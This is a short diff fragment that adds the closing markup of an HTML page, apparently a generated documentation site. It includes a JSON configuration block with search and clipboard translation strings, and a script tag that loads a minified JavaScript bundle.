+    <script id="__config" type="application/json">{"base": "../../..", "features": [], "search": "../../../assets/javascripts/workers/search.b97dbffb.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version.title": "Select version"}}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.0238f547.min.js"></script>
+      
+    
+  </body>
+</html>
